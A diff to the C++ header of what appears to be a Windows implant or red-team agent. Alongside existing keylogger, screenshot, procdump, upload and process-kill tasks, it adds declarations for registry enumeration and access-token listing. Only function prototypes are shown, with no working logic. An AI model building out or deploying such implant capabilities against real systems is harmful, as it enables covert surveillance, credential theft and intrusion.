@@ -18,7 +18,9 @@
 #include "keylog.hpp"
 #include "macros.hpp"
 #include "net.hpp"
+#include "registry.hpp"
 #include "screenshot.hpp"
+#include "token.hpp"
 #include "utils.hpp"
 #include "winhttp.hpp"
 #include "winsystem.hpp"
@@ -54,10 +56,21 @@ std::wstring ExecuteTaskProcdump(const std::wstring& wPid);
 std::wstring ExecuteTaskPs();
 std::wstring ExecuteTaskPsKill(const std::wstring& wPid);
 std::wstring ExecuteTaskPwd();
+std::wstring ExecuteTaskRegSubKeys(
+	const std::wstring& wRootKey,
+	const std::wstring& wSubKey,
+	BOOL bRecurse
+);
+std::wstring ExecuteTaskRegValues(
+	const std::wstring& wRootKey,
+	const std::wstring& wSubKey,
+	BOOL bRecurse
+);
 std::wstring ExecuteTaskRm(const std::wstring& wFile);
 std::wstring ExecuteTaskRmdir(const std::wstring& wDir);
 std::wstring ExecuteTaskScreenshot(HINSTANCE hInstance, INT nCmdShow);
 std::wstring ExecuteTaskSleep(const std::wstring& wSleepTime, INT &nSleep);
+std::wstring ExecuteTaskTokenList();
 std::wstring ExecuteTaskUpload(
     HINTERNET hConnect,
     const std::wstring& wSrc,
